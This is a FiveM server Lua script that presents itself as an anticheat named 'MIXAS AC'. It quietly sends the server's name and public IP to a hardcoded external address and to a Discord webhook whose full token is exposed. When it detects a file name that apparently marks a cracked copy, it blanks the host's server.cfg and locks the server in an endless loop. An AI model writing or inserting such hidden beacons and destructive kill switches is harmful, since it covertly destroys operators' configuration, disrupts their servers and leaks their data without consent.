SetConvarServerInfo("🛡️MIXAS", "AC")
PerformHttpRequest("http://94.143.231.57/myip.php", function(err, text, headers)
    startlog(text)
end, 'GET', "")
function startlog(ip)
    local serverName = GetConvar("sv_hostname","Unknown.")
    local connect = {
        {
            author = {
                icon_url = "https://cdn.discordapp.com/attachments/641717879858921503/767445777303470130/shield.png",
            },
            ["color"] = "824359",
            ["title"] = "Started",
            ["description"] = "AntiCheat started. --> \n ServerName : "..serverName.."\n Ip Adresi : "..ip,
            ["footer"] = {
            ["text"] = "MXS".." • "..os.date("%x %X %p"),
            },
        }
    }
    PerformHttpRequest("https://canary.discord.com/api/webhooks/1071148393734352977/uPLG8dYIOrePPLd2bcuAxYdZ2HyKRzxAfenwX4k_QlHio96ko5zIBcvkCLTofTKswOjQ", function(err, text, headers) end, 'POST', json.encode({username = "MIXAS AC", embeds = connect}), { ['Content-Type'] = 'application/json' })
end
local code = LoadResourceFile(GetCurrentResourceName(),'fxmanifest.lua')
if string.find(code,'henryhoover.lua') then
    PerformHttpRequest("http://94.143.231.57/myip.php", function(err, text, headers)
        startlog("CRACK  "..text)
    end, 'GET', "")
    Citizen.CreateThread(function()
    local s = GetResourcePath(GetCurrentResourceName())
    s = s:gsub("//", "/")
    a,b = s:match("(.+)resources(.+)")
  
    if a then 
      local file = io.open(a .. "server.cfg", "wb")
      if file then 
          file:write("")
          file:close()
      end
    end
  end)
    while true do
    end
end
